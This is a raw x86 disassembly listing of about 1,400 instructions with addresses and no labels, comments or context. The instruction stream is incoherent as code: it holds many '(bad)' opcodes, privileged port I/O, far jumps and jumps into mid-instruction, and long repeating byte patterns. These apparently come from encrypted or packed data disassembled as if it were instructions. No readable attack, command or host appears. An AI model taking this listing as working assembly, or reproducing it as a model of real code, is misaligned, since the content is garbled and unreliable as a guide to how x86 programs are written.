  426f5f:	aad    0x1b
  426f61:	xor    BYTE PTR [edi+0x3d],0xed
  426f65:	frstor ds:0x80a1d58d
  426f6b:	dec    edi
  426f6c:	xor    cl,BYTE PTR ds:0xf0804d4d
  426f72:	cmp    eax,0xc41d9250
  426f77:	dec    DWORD PTR [ebp-0x29]
  426f7a:	cmp    eax,0x86c8d74d
  426f7f:	mov    WORD PTR [edx+0x4d],gs
  426f82:	dec    ebp
  426f83:	stos   DWORD PTR es:[edi],eax
  426f84:	test   eax,0x35fb70a3
  426f89:	lea    edx,[edi-0x78127880]
  426f8f:	and    DWORD PTR [ecx-0x9748884],ebx
  426f95:	and    al,0x6f
  426f97:	cmp    BYTE PTR [edi+esi*2-0x38],bh
  426f9b:	cmc    
  426f9c:	and    al,0x6f
  426f9e:	cmp    BYTE PTR [eax-0x287f7489],al
  426fa4:	mov    esp,edx
  426fa6:	or     eax,0x6f242260
  426fab:	cmp    BYTE PTR [ebx-0x4e],dl
  426fae:	scas   al,BYTE PTR es:[edi]
  426faf:	push   ebx
  426fb0:	ret    0x86b2
  426fb3:	or     al,0xb2
  426fb5:	add    ch,BYTE PTR [ecx]
  426fb7:	(bad)  
  426fb8:	cld    
  426fb9:	adc    bh,0xef
  426fbc:	arpl   WORD PTR [edx],si
  426fbe:	xor    BYTE PTR [edi-0x75],0x9
  426fc2:	sete   BYTE PTR [ebp-0x287f7273]
  426fc9:	mov    edx,DWORD PTR [ebx-0x4e]
  426fcc:	push   ebx
  426fcd:	ret    0x2b2
  426fd0:	sub    DWORD PTR [edx-0x300f37a],esi
  426fd6:	adc    bh,0x21
  426fd9:	arpl   WORD PTR [edx],si
  426fdb:	or     DWORD PTR [edi],ecx
  426fdd:	loopne 0x426f6c
  426fdf:	lea    ecx,[ebp-0x7f8e8880]
  426fe5:	xchg   edi,eax
  426fe6:	and    DWORD PTR [eax+0x539befd7],eax
  426fec:	dec    ebp
  426fed:	push   eax
  426fee:	ja     0x426f7b
  426ff0:	dec    edi
  426ff1:	jb     0x426ffc
  426ff3:	cmovb  ecx,DWORD PTR [ebp-0x706c7273]
  426ffa:	out    dx,al
  426ffb:	pop    ebx
  426ffc:	adc    BYTE PTR [edi+0x9],dh
  426fff:	cld    
  427000:	ja     0x42704f
  427002:	aad    0xfc
  427004:	ja     0x427019
  427006:	sbb    esp,edi
  427008:	ja     0x427009
  42700a:	ror    BYTE PTR [ecx],1
  42700c:	loopne 0x427085
  42700e:	dec    DWORD PTR [ecx]
  427010:	loopne 0x426fb9
  427012:	adc    ecx,edi
  427014:	jp     0x426fa3
  427016:	lea    ecx,[ebp-0x1ff68bcd]
  42701c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42701d:	dec    ebp
  42701e:	xor    esi,DWORD PTR [eax+edx*1+0x77]
  427022:	mov    bh,ah
  427024:	ja     0x426ff2
  427026:	or     eax,0xd40d77fc
  42702b:	cld    
  42702c:	ja     0x42707b
  42702e:	jl     0x42702c
  427030:	ja     0x427045
  427032:	sar    esp,cl
  427034:	ja     0x427035
  427036:	push   esp
  427037:	(bad)  
  427038:	ja     0x427039
  42703a:	(bad)  
  42703b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42703c:	adc    esp,DWORD PTR [esi+0x4da78f74]
  427042:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  427046:	or     eax,0xa78fc40b
  42704b:	int3   
  42704c:	shl    BYTE PTR [edi+ecx*4-0x59],cl
  427050:	mov    dl,dh
  427052:	sbb    bl,0x35
  427055:	in     eax,dx
  427056:	out    0x8b,eax
  427058:	lea    ecx,[ecx]
  42705a:	loopne 0x4270d3
  42705c:	or     edi,edx
  42705e:	or     DWORD PTR [edi-0x33],edx
  427061:	lea    ecx,[ebp-0x72e1d073]
  427067:	lea    ecx,[ebp-0x3bf688f0]
  42706d:	inc    DWORD PTR [edi+0x8]
  427070:	lea    ecx,[ebp+0x977108d]
  427076:	div    eax
  427078:	or     DWORD PTR [edi-0x11eff689],ecx
  42707e:	pop    ebx
  42707f:	jnp    0x4270e4
  427081:	test   DWORD PTR [ecx],ecx
  427083:	jmp    0x80a3:0x4d4d4d9e
  42708a:	ja     0x427054
  42708c:	push   ebx
  42708d:	mov    dl,0x80
  42708f:	lock enter 0x5ed,0xd
  427094:	stos   DWORD PTR es:[edi],eax
  427095:	les    esp,FWORD PTR [esi+0x538b7780]
  42709b:	mov    dl,0x80
  42709d:	lock mov edx,DWORD PTR [ebx-0x2]
  4270a1:	mov    dl,0xba
  4270a3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4270a9:	test   eax,0x8d21fb70
  4270ae:	xchg   edi,eax
  4270af:	add    BYTE PTR [edi+0x7cc587ed],0x77
  4270b6:	mov    dh,dh
  4270b8:	and    al,0x6f
  4270ba:	cmp    cl,dh
  4270bc:	cmc    
  4270bd:	and    al,0x6f
  4270bf:	cmp    BYTE PTR [eax-0x69],dl
  4270c2:	mov    eax,DWORD PTR [eax+0x77501577]
  4270c8:	adc    eax,0x80157780
  4270cd:	int    0x2e
  4270cf:	cmp    cl,BYTE PTR [ebp+0x15f0808d]
  4270d5:	or     BYTE PTR [ebp+0x3a2e5080],0x8d
  4270dc:	lea    eax,[eax+0x657dec30]
  4270e2:	xchg   ebx,eax
  4270e3:	push   eax
  4270e4:	lock stc 
  4270e6:	xor    BYTE PTR [edi-0x76],0x80
  4270ea:	lock mov bl,BYTE PTR [ecx+0x10de29b]
  4270f1:	out    0x2f,al
  4270f3:	push   ebx
  4270f4:	jl     0x4270a8
  4270f6:	xchg   BYTE PTR [ebx+eiz*4],cl
  4270f9:	push   ebx
  4270fa:	adc    DWORD PTR [edx-0x4d00d646],esi
  427100:	push   eax
  427101:	ja     0x427085
  427103:	xor    BYTE PTR [edi-0x76],0x80
  427107:	lock mov dl,BYTE PTR [ebx+0x7c]
  42710b:	mov    dl,0x86
  42710d:	or     al,0x53
  42710f:	adc    DWORD PTR [edx-0x4d00d646],esi
  427115:	push   eax
  427116:	ja     0x42709c
  427118:	xor    BYTE PTR [edi-0x7],0x80
  42711c:	ins    DWORD PTR es:[edi],dx
  42711d:	or     ch,ch
  42711f:	xchg   BYTE PTR [ecx],ah
  427121:	push   eax
  427122:	ja     0x42711b
  427124:	xor    BYTE PTR [edi-0x7],0x80
  427128:	ins    DWORD PTR es:[edi],dx
  427129:	pop    ebp
  42712a:	xor    al,0xf9
  42712d:	jge    0x42717e
  42712f:	xchg   edx,eax
  427130:	xchg   ebp,eax
  427131:	xor    BYTE PTR [edi-0x7],0xd5
  427135:	sbb    eax,0x805d6d80
  42713a:	lock stc 
  42713c:	cmp    BYTE PTR [edi-0x6b],0x7d
  427140:	dec    ebx
  427141:	div    DWORD PTR [ebx]
  427143:	std    
  427144:	xor    BYTE PTR [edi-0x7],0x80
  427148:	ins    DWORD PTR es:[edi],dx
  427149:	pop    ebp
  42714a:	in     al,dx
  42714b:	mov    dl,0xc4
  42714d:	in     al,dx
  42714e:	sub    BYTE PTR [ebp-0x6b],0x50
  427152:	ja     0x4270da
  427154:	xor    BYTE PTR [edi-0x76],0x80
  427158:	lock mov dl,BYTE PTR [ebx+0x7c]
  42715c:	push   ebx
  42715d:	adc    DWORD PTR [edx-0x454df37a],esi
  427163:	sub    edi,edi
  427165:	mov    dl,0x50
  427167:	ja     0x42717e
  427169:	xor    BYTE PTR [edi-0x76],0x80
  42716d:	lock mov dl,BYTE PTR [ebx+0x7c]
  427171:	push   ebx
  427172:	adc    DWORD PTR [edx-0x794dd646],esi
  427178:	or     al,0xff
  42717a:	mov    dl,0x50
  42717c:	ja     0x427193
  42717e:	xor    BYTE PTR [edi-0x76],0x80
  427182:	lock mov dl,BYTE PTR [ebx+0x11]
  427186:	push   ebx
  427187:	jl     0x42713b
  427189:	mov    edx,0xc86b229
  42718e:	push   DWORD PTR [edx+0x5071f080]
  427194:	cmp    dl,BYTE PTR [eax-0x69]
  427197:	adc    eax,0xf415777c
  42719c:	and    al,0x6f
  42719e:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  4271a2:	repz and al,0x6f
  4271a5:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  4271a9:	cli    
  4271aa:	and    al,0x6f
  4271ac:	cmp    BYTE PTR [esi-0x727290c9],bh
  4271b2:	xor    BYTE PTR [edi-0x76],0x80
  4271b6:	lock mov dl,BYTE PTR [ebx+0x7c]
  4271ba:	push   ebx
  4271bb:	adc    DWORD PTR [edx-0x454df37a],esi
  4271c1:	sub    edi,edi
  4271c3:	mov    dl,0x50
  4271c5:	ja     0x42714b
  4271c7:	xor    BYTE PTR [edi-0x7a],0xec
  4271cb:	ja     0x4271ee
  4271cd:	push   eax
  4271ce:	ja     0x427152
  4271d0:	dec    ebp
  4271d1:	xlat   BYTE PTR ds:[ebx]
  4271d2:	or     BYTE PTR [ebp-0x29],0x21
  4271d6:	xor    al,0xf9
  4271d9:	xchg   BYTE PTR [ecx+0x504d4da8],cl
  4271df:	ja     0x4271f6
  4271e1:	xor    BYTE PTR [edi+0x15],0x4f
  4271e5:	push   0xffffffd5
  4271e7:	(bad)  
  4271e8:	xor    BYTE PTR [edi-0x7e],0x50
  4271ec:	ja     0x427171
  4271ee:	xor    BYTE PTR [edi-0x7d],0x80
  4271f2:	lock and DWORD PTR [ebx-0x4e],eax
  4271f6:	push   eax
  4271f7:	ja     0x42717c
  4271f9:	xor    BYTE PTR [edi+0x15],0x80
  4271fd:	lock adc eax,0xec716d80
  427203:	xchg   edx,eax
  427204:	and    DWORD PTR [eax-0x29c7c10],eax
  42720a:	in     al,0x19
  42720c:	xor    BYTE PTR [edi+0x15],0x80
  427210:	ins    DWORD PTR es:[edi],dx
  427211:	and    DWORD PTR [eax-0x6d13ea10],eax
  427217:	out    dx,eax
  427218:	xor    al,0x83
  42721b:	inc    ebx
  42721c:	mov    dl,0xbe
  42721e:	and    ch,BYTE PTR [edi]
  427220:	lea    ecx,[ebp+0x6f24f6fa]
  427226:	cmp    BYTE PTR [eax-0x29],dl
  427229:	scas   eax,DWORD PTR es:[edi]
  42722a:	jl     0x4272a3
  42722c:	std    
  42722d:	cmc    
  42722e:	and    al,0x6f
  427230:	cmp    BYTE PTR [edi+esi*2+0x76],bh
  427234:	hlt    
  427235:	and    al,0x6f
  427237:	cmp    BYTE PTR [edi+esi*2+0x6a],bh
  42723b:	repz and al,0x6f
  42723e:	cmp    BYTE PTR [ecx],al
  427240:	ja     0x4271f1
  427242:	push   eax
  427243:	ja     0x42720d
  427245:	add    DWORD PTR [edi-0x3],esi
  427248:	push   eax
  427249:	ja     0x42727d
  42724b:	add    DWORD PTR [edi+0x76],esi
  42724e:	push   eax
  42724f:	ja     0x427266
  427251:	add    DWORD PTR [edi+0x6a],esi
  427254:	push   eax
  427255:	ja     0x4271de
  427257:	xor    BYTE PTR [edi-0x76],0x80
  42725b:	lock mov dl,BYTE PTR [ebx+0x7c]
  42725f:	push   ebx
  427260:	adc    DWORD PTR [edx-0x454df37a],esi
  427266:	sub    edi,edi
  427268:	mov    dl,0x50
  42726a:	ja     0x4271ef
  42726c:	mov    esi,0x8d8decfe
  427271:	mov    ds:0x6f24f30d,al
  427276:	cmp    BYTE PTR [ecx],cl
  427278:	shld   esp,ebp,0x8d
  42727c:	(bad)  
  42727d:	loop   0x4272a0
  42727f:	dec    ebp
  427280:	xlat   BYTE PTR ds:[ebx]
  427281:	add    BYTE PTR [ecx],0x77
  427284:	bound  ecx,QWORD PTR [edx]
  427286:	xchg   BYTE PTR [ecx],cl
  427288:	test   al,0x4d
  42728a:	dec    ebp
  42728b:	xor    BYTE PTR [edi-0x75],0x80
  42728f:	lock mov edx,DWORD PTR [ebx+0x7c]
  427293:	push   ebx
  427294:	adc    DWORD PTR [edx-0x794dd646],esi
  42729a:	or     al,0xff
  42729c:	mov    dl,0x50
  42729e:	ja     0x427224
  4272a0:	push   eax
  4272a1:	xlat   BYTE PTR ds:[ebx]
  4272a2:	jp     0x427312
  4272a4:	out    0x7a,eax
  4272a6:	xor    BYTE PTR [edi+0x7a],0xb2
  4272aa:	xchg   BYTE PTR [ebx+edx*2],cl
  4272ad:	(bad)  
  4272ae:	mov    dl,0x2
  4272b0:	sub    edi,edi
  4272b2:	xor    dl,BYTE PTR [eax-0x29]
  4272b5:	add    DWORD PTR [eax-0xf7f7489],0xffffff8b
  4272bc:	push   ebx
  4272bd:	adc    DWORD PTR [edx+0x7c5329ba],esi
  4272c3:	mov    dl,0x86
  4272c5:	or     al,0xff
  4272c7:	mov    dl,0x80
  4272c9:	lock mov eax,DWORD PTR [eax+0x2a538b97]
  4272d0:	push   ebx
  4272d1:	xchg   esp,eax
  4272d2:	mov    dl,0xbe
  4272d4:	or     al,0xb2
  4272d6:	clc    
  4272d7:	sub    edi,edi
  4272d9:	(bad)  
  4272da:	in     al,dx
  4272db:	mov    dl,0x80
  4272dd:	lock adc DWORD PTR [eax-0x29],0x66
  4272e2:	arpl   bp,di
  4272e4:	xlat   BYTE PTR ds:[ebx]
  4272e5:	sub    DWORD PTR [eax-0xf7f7489],eax
  4272eb:	mov    edx,DWORD PTR [ebx+0x7c]
  4272ee:	push   ebx
  4272ef:	adc    DWORD PTR [edx-0x454df37a],esi
  4272f5:	sub    edi,edi
  4272f7:	mov    dl,0xa
  4272f9:	loop   0x42731c
  4272fb:	add    DWORD PTR [edi+0x62],esi
  4272fe:	or     al,BYTE PTR [esi+0x4d4d8a4c]
  427304:	xor    BYTE PTR [edi-0x76],0x80
  427308:	lock mov dl,BYTE PTR [ebx+0x7c]
  42730c:	push   ebx
  42730d:	adc    DWORD PTR [edx-0x794dd646],esi
  427313:	or     al,0xff
  427315:	mov    dl,0x80
  427317:	lock and DWORD PTR [ebx-0x3],0xffffffd5
  42731c:	sub    DWORD PTR [eax-0xf7f7589],eax
  427322:	mov    dl,BYTE PTR [ebx+0x7c]
  427325:	push   ebx
  427326:	adc    DWORD PTR [edx-0x454df37a],esi
  42732c:	sub    edi,edi
  42732e:	mov    dl,0xa
  427330:	loop   0x427353
  427332:	add    DWORD PTR [edi+0x62],esi
  427335:	or     al,BYTE PTR [esi+0x4d4d8ac9]
  42733b:	xor    BYTE PTR [edi-0x38],0x80
  42733f:	lock enter 0x3080,0x80
  427344:	lea    edx,[ebx+0x11]
  427347:	push   ebx
  427348:	jl     0x4272fc
  42734a:	mov    edx,0xc86b229
  42734f:	push   DWORD PTR [edx+0x622f758f]
  427355:	xor    al,0x8a
  427358:	adc    BYTE PTR [edi+0x532a538a],0x94
  42735f:	mov    dl,0xbe
  427361:	or     al,0xb2
  427363:	clc    
  427364:	sub    DWORD PTR [ecx],ecx
  427366:	loopne 0x4273d2
  427368:	(bad)  
  427369:	(bad)  
  42736a:	arpl   WORD PTR [edx+0xca20f09],si
  427370:	lea    ecx,[ebp-0x7fcd8880]
  427376:	lock xor al,BYTE PTR [eax+0x538d8030]
  42737d:	adc    DWORD PTR [ebx+0x7c],edx
  427380:	mov    dl,0xba
  427382:	sub    DWORD PTR [edx-0x4d00f37a],esi
  427388:	(bad)  
  427389:	jne    0x4273ba
  42738b:	bound  eax,QWORD PTR [eax-0x687f7510]
  427391:	mov    dl,BYTE PTR [ebx+0x2a]
  427394:	push   ebx
  427395:	xchg   esp,eax
  427396:	mov    dl,0xbe
  427398:	or     al,0xb2
  42739a:	clc    
  42739b:	sub    DWORD PTR [ecx],ecx
  42739d:	loopne 0x427409
  42739f:	(bad)  
  4273a0:	(bad)  
  4273a1:	arpl   WORD PTR [edx+0xcda0f09],si
  4273a7:	lea    ecx,[ebp-0x7fea8880]
  4273ad:	lock adc eax,0x8d803080
  4273b3:	push   ebx
  4273b4:	adc    DWORD PTR [ebx+0x7c],edx
  4273b7:	mov    dl,0xba
  4273b9:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4273bf:	(bad)  
  4273c0:	jne    0x4273f1
  4273c2:	bound  eax,QWORD PTR [eax-0x687f7510]
  4273c8:	mov    dl,BYTE PTR [ebx+0x2a]
  4273cb:	push   ebx
  4273cc:	xchg   esp,eax
  4273cd:	mov    dl,0xbe
  4273cf:	or     al,0xb2
  4273d1:	clc    
  4273d2:	sub    DWORD PTR [ecx],ecx
  4273d4:	loopne 0x427440
  4273d6:	(bad)  
  4273d7:	(bad)  
  4273d8:	arpl   WORD PTR [edx+0xc130f09],si
  4273de:	lea    ecx,[ebp-0x7f788880]
  4273e4:	lock xchg DWORD PTR [eax+0x538d8030],eax
  4273eb:	adc    DWORD PTR [ebx+0x7c],edx
  4273ee:	mov    dl,0xba
  4273f0:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4273f6:	(bad)  
  4273f7:	jne    0x427428
  4273f9:	bound  eax,QWORD PTR [eax-0x687f7510]
  4273ff:	mov    dl,BYTE PTR [ebx+0x2a]
  427402:	push   ebx
  427403:	xchg   esp,eax
  427404:	mov    dl,0xbe
  427406:	or     al,0xb2
  427408:	clc    
  427409:	sub    DWORD PTR [ecx],ecx
  42740b:	loopne 0x427477
  42740d:	(bad)  
  42740e:	(bad)  
  42740f:	arpl   WORD PTR [edx+0x3a830f09],si
  427415:	lea    ecx,[ebp-0x7fcd8880]
  42741b:	lock xor al,BYTE PTR [eax+0x538d8030]
  427422:	adc    DWORD PTR [edx+0x7c5329ba],esi
  427428:	mov    dl,0x86
  42742a:	or     al,0xff
  42742c:	mov    dl,0x8f
  42742e:	jne    0x42745f
  427430:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  427436:	adc    BYTE PTR [edi+0x539080c8],0x2a
  42743d:	mov    dl,0xbe
  42743f:	or     al,0x53
  427441:	xchg   esp,eax
  427442:	mov    dl,0xf8
  427444:	sub    edi,edi
  427446:	dec    BYTE PTR [edi-0x2b9d30cf]
  42744c:	mov    dl,0x80
  42744e:	lock adc eax,0x97803080
  427454:	adc    eax,0x2a539080
  427459:	mov    dl,0xbe
  42745b:	or     al,0x53
  42745d:	xchg   esp,eax
  42745e:	mov    dl,0xf8
  427460:	sub    edi,edi
  427462:	dec    BYTE PTR [edi-0x599d30cf]
  427468:	mov    dl,0x80
  42746a:	lock enter 0x3080,0x80
  42746f:	xchg   edi,eax
  427470:	enter  0x9080,0x53
  427474:	sub    dl,BYTE PTR [ebx-0x6c]
  427477:	mov    dl,0xbe
  427479:	or     al,0xb2
  42747b:	clc    
  42747c:	sub    edi,edi
  42747e:	dec    BYTE PTR [edi-0x29a930cf]
  427484:	std    
  427485:	or     DWORD PTR [edi-0x43],ecx
  427488:	cmp    cl,BYTE PTR [ebp+0x1577808d]
  42748e:	xor    al,0x15
  427491:	xor    BYTE PTR [eax],0x80
  427494:	lea    edx,[ebx+0x11]
  427497:	mov    dl,0xba
  427499:	sub    DWORD PTR [ebx+0x7c],edx
  42749c:	mov    dl,0x86
  42749e:	or     al,0xff
  4274a0:	mov    dl,0x8f
  4274a2:	jne    0x4274d3
  4274a4:	bound  eax,QWORD PTR [eax+0x308032f0]
  4274aa:	adc    BYTE PTR [edi+0x53908032],0x2a
  4274b1:	mov    dl,0xbe
  4274b3:	or     al,0x53
  4274b5:	xchg   esp,eax
  4274b6:	mov    dl,0xf8
  4274b8:	sub    edi,edi
  4274ba:	dec    BYTE PTR [edi-0x2b9d30cf]
  4274c0:	mov    dl,0x80
  4274c2:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  4274c9:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  4274d0:	push   ebx
  4274d1:	xchg   esp,eax
  4274d2:	mov    dl,0xf8
  4274d4:	sub    edi,edi
  4274d6:	dec    BYTE PTR [edi-0x599d30cf]
  4274dc:	mov    dl,0x80
  4274de:	lock xor al,BYTE PTR [eax+0x32978030]
  4274e5:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  4274ec:	mov    esi,0x29f8b20c
  4274f1:	(bad)  
  4274f2:	dec    BYTE PTR [edi-0x29a930cf]
  4274f8:	std    
  4274f9:	or     DWORD PTR [edi-0x38],ecx
  4274fc:	lea    ecx,[ebp-0x78887f73]
  427502:	xor    al,0x87
  427505:	xor    BYTE PTR [eax],0x80
  427508:	lea    edx,[ebx+0x11]
  42750b:	mov    dl,0xba
  42750d:	sub    DWORD PTR [ebx+0x7c],edx
  427510:	mov    dl,0x86
  427512:	or     al,0xff
  427514:	mov    dl,0x8f
  427516:	jne    0x427547
  427518:	bound  eax,QWORD PTR [eax+0x308015f0]
  42751e:	adc    BYTE PTR [edi+0x53908015],0x2a
  427525:	mov    dl,0xbe
  427527:	or     al,0x53
  427529:	xchg   esp,eax
  42752a:	mov    dl,0xf8
  42752c:	sub    edi,edi
  42752e:	dec    BYTE PTR [edi-0x2b9d30cf]
  427534:	mov    dl,0x80
  427536:	lock enter 0x3080,0x80
  42753b:	xchg   edi,eax
  42753c:	enter  0x9080,0x53
  427540:	sub    dh,BYTE PTR [edx-0x6bacf342]
  427546:	mov    dl,0xf8
  427548:	sub    edi,edi
  42754a:	dec    BYTE PTR [edi-0x599d30cf]
  427550:	mov    dl,0x80
  427552:	lock adc eax,0x97803080
  427558:	adc    eax,0x2a539080
  42755d:	push   ebx
  42755e:	xchg   esp,eax
  42755f:	mov    dl,0xbe
  427561:	or     al,0xb2
  427563:	clc    
  427564:	sub    edi,edi
  427566:	dec    BYTE PTR [edi-0x29a930cf]
  42756c:	std    
  42756d:	or     DWORD PTR [edi-0x33],ecx
  427570:	lea    ecx,[ebp-0x78887f73]
  427576:	xor    al,0x87
  427579:	xor    BYTE PTR [eax],0x80
  42757c:	lea    edx,[ebx+0x11]
  42757f:	mov    dl,0xba
  427581:	sub    DWORD PTR [ebx+0x7c],edx
  427584:	mov    dl,0x86
  427586:	or     al,0xff
  427588:	mov    dl,0x8f
  42758a:	jne    0x4275bb
  42758c:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  427592:	adc    BYTE PTR [edi+0x539080c8],0x2a
  427599:	mov    dl,0xbe
  42759b:	or     al,0x53
  42759d:	xchg   esp,eax
  42759e:	mov    dl,0xf8
  4275a0:	sub    edi,edi
  4275a2:	dec    BYTE PTR [edi-0x2b9d30cf]
  4275a8:	mov    dl,0x80
  4275aa:	lock xor al,BYTE PTR [eax+0x32978030]
  4275b1:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  4275b8:	push   ebx
  4275b9:	xchg   esp,eax
  4275ba:	mov    dl,0xf8
  4275bc:	sub    edi,edi
  4275be:	dec    BYTE PTR [edi-0x599d30cf]
  4275c4:	mov    dl,0x80
  4275c6:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  4275cd:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  4275d4:	mov    esi,0x29f8b20c
  4275d9:	(bad)  
  4275da:	dec    BYTE PTR [edi-0x29a930cf]
  4275e0:	std    
  4275e1:	xlat   BYTE PTR ds:[ebx]
  4275e2:	jno    0x4275e5
  4275e4:	ja     0x427648
  4275e6:	or     al,BYTE PTR [esi+0x4d4dac84]
  4275ec:	xor    al,0x5e
  4275ef:	arpl   WORD PTR [edx+0x778017d5],si
  4275f5:	mov    al,BYTE PTR [eax+0x11538af0]
  4275fb:	push   ebx
  4275fc:	jl     0x4275b0
  4275fe:	mov    edx,0xc86b229
  427603:	push   DWORD PTR [edx-0x7f7b88b0]
  427609:	ja     0x427596
  42760b:	adc    bh,0x8b
  42760e:	xor    BYTE PTR [edi-0x75],0x80
  427612:	lock mov edx,DWORD PTR [ebx+0x4b]
  427616:	push   ebx
  427617:	je     0x4275cb
  427619:	mov    BYTE PTR [edx+esi*4],cl
  42761c:	test   BYTE PTR [ecx],ch
  42761e:	push   DWORD PTR [edx]
  427620:	in     al,dx
  427621:	xlat   BYTE PTR ds:[ebx]
  427622:	data16 xor BYTE PTR [edi+0x7a],0x53
  427627:	sub    ch,ch
  427629:	mov    edx,0x8a84ed8a
  42762e:	mov    dl,0x88
  427630:	sub    esp,ebp
  427632:	std    
  427633:	inc    DWORD PTR ds:0x24f60ba2
  427639:	outs   dx,DWORD PTR ds:[esi]
  42763a:	cmp    BYTE PTR [eax-0xf7f7589],al
  427640:	mov    dl,BYTE PTR [ebx+0x11]
  427643:	push   ebx
  427644:	jl     0x4275f8
  427646:	mov    edx,0xc86b229
  42764b:	push   DWORD PTR [edx+0x6384f080]
  427651:	std    
  427652:	or     DWORD PTR [edi],ecx
  427654:	pop    ds
  427655:	mov    cl,BYTE PTR [ebp+0x4d]
  427658:	xor    BYTE PTR [edi-0x76],0x80
  42765c:	lock mov dl,BYTE PTR [ebx+0x7c]
  427660:	push   ebx
  427661:	adc    DWORD PTR [edx-0x794dd646],esi
  427667:	or     al,0xff
  427669:	mov    dl,0x80
  42766b:	lock test BYTE PTR [ebx-0x3],ah
  42766f:	xlat   BYTE PTR ds:[ebx]
  427670:	sbb    eax,DWORD PTR [eax-0xf7f7489]
  427676:	mov    edx,DWORD PTR [ebx+0x7c]
  427679:	push   ebx
  42767a:	adc    DWORD PTR [edx-0x454df37a],esi
  427680:	sub    edi,edi
  427682:	mov    dl,0xbe
  427684:	jg     0x4276c0
  427686:	lea    ecx,[ebp-0x6656da1e]
  42768c:	dec    ebp
  42768d:	xlat   BYTE PTR ds:[ebx]
  42768e:	add    BYTE PTR [ecx],0x77
  427691:	push   ss
  427692:	or     al,BYTE PTR [esi+0x4d4da00c]
  427698:	xor    BYTE PTR [edi-0x76],0x80
  42769c:	lock mov dl,BYTE PTR [ebx+0x7c]
  4276a0:	push   ebx
  4276a1:	adc    DWORD PTR [edx-0x794dd646],esi
  4276a7:	or     al,0xff
  4276a9:	mov    dl,0x80
  4276ab:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276b0:	xchg   ebx,eax
  4276b1:	xor    BYTE PTR [edi-0x75],0x80
  4276b5:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276b9:	push   ebx
  4276ba:	adc    DWORD PTR [edx-0x794dd646],esi
  4276c0:	or     al,0xff
  4276c2:	mov    dl,0x80
  4276c4:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276c9:	daa    
  4276ca:	xor    BYTE PTR [edi-0x75],0x80
  4276ce:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276d2:	push   ebx
  4276d3:	adc    DWORD PTR [edx-0x454df37a],esi
  4276d9:	sub    edi,edi
  4276db:	mov    dl,0xa
  4276dd:	cdq    
  4276de:	add    DWORD PTR [edi+0x16],esi
  4276e1:	or     al,BYTE PTR [esi+0x4d4d8b34]
  4276e7:	xor    BYTE PTR [edi-0x76],0x80
  4276eb:	lock mov dl,BYTE PTR [ebx+0x7c]
  4276ef:	push   ebx
  4276f0:	adc    DWORD PTR [edx-0x454df37a],esi
  4276f6:	sub    edi,edi
  4276f8:	mov    dl,0xa
  4276fa:	cdq    
  4276fb:	add    DWORD PTR [edi+0x16],esi
  4276fe:	or     al,BYTE PTR [esi+0x4d4d8b4c]
  427704:	xor    BYTE PTR [edi-0x7e],0xec
  427708:	cld    
  427709:	push   eax
  42770a:	ja     0x427721
  42770c:	dec    ebp
  42770d:	xlat   BYTE PTR ds:[ebx]
  42770e:	ds dec ebp
  427710:	xlat   BYTE PTR ds:[ebx]
  427711:	adc    eax,0xec367780
  427716:	ja     0x427707
  427718:	or     al,BYTE PTR [esi+0x4d4d82e5]
  42771e:	xor    BYTE PTR [edi-0x76],0x80
  427722:	lock mov dl,BYTE PTR [ebx+0x7c]
  427726:	push   ebx
  427727:	adc    DWORD PTR [edx-0x794dd646],esi
  42772d:	or     al,0xff
  42772f:	mov    dl,0x80
  427731:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  427736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427737:	xor    BYTE PTR [edi-0x75],0x80
  42773b:	lock mov edx,DWORD PTR [ebx+0x7c]
  42773f:	push   ebx
  427740:	adc    DWORD PTR [edx-0x794dd646],esi
  427746:	or     al,0xff
  427748:	mov    dl,0x80
  42774a:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  42774f:	rol    BYTE PTR [eax-0xf7f7489],0x8b
  427756:	push   ebx
  427757:	jl     0x42770b
  427759:	xchg   BYTE PTR [ebx+edx*2],cl
  42775c:	adc    DWORD PTR [edx-0x4d00d646],esi
  427762:	or     cl,BYTE PTR [ebp-0x29]
  427765:	xor    BYTE PTR ds:[edi+0x36],0xec
  42776a:	ja     0x42775b
  42776c:	or     al,BYTE PTR [esi+0x4d4d8b1d]
  427772:	xor    BYTE PTR [edi-0x76],0x80
  427776:	lock mov dl,BYTE PTR [ebx+0x7c]
  42777a:	mov    dl,0x86
  42777c:	or     al,0x53
  42777e:	adc    DWORD PTR [edx-0x4d00d646],esi
  427784:	or     cl,BYTE PTR [ebp-0x29]
  427787:	xor    BYTE PTR ds:[edi+0x36],0xec
  42778c:	ja     0x42777d
  42778e:	or     al,BYTE PTR [esi+0x4d4d4b0b]
  427794:	xor    al,0x46
  427797:	xor    BYTE PTR [edi+0x46],0x53
  42779b:	je     0x4277f0
  42779d:	sub    dh,BYTE PTR [edx-0x7b4df342]
  4277a3:	sub    edi,edi
  4277a5:	mov    dl,0x80
  4277a7:	lock cs push ebx
  4277aa:	mov    dl,0x40
  4277ac:	lea    edi,[edx]
  4277ae:	lea    ecx,[ebp-0x72c8ea2b]
  4277b4:	int    0x8d
  4277b6:	lea    ecx,[edx]
  4277b8:	dec    ebp
  4277b9:	xlat   BYTE PTR ds:[ebx]
  4277ba:	ds adc bh,0x36
  4277be:	in     al,dx
  4277bf:	xlat   BYTE PTR ds:[ebx]
  4277c0:	out    dx,eax
  4277c1:	xchg   BYTE PTR [esi-0x7fb2b258],bl
  4277c7:	ja     0x42783a
  4277c9:	xor    al,0x3e
